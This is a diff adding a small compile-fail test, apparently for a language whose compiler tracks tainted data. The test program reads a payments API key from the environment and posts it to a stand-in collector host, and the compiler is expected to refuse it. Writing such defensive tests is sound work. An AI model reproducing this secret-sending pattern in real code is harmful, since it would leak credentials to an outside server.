@@ -1,0 +1,17 @@
+// Env API key -> network egress.
+//
+// Expected: error[NL-0500]. `env(key:)` returns @user_input. `http_post`
+// requires @audit_safe for body, so the compiler refuses before the key can
+// leave on the wire.
+
+fn report_status() -> Int [net, env]:
+    let api_key = env(key: "PAYMENTS_API_KEY")
+    match http_post(url: "https://collector.example/status", body: api_key):
+        Result.ok(value: _r):
+            return 0
+        Result.error(message: _e):
+            return 1
+
+fn main() -> Int [net, env]:
+    return report_status()
+
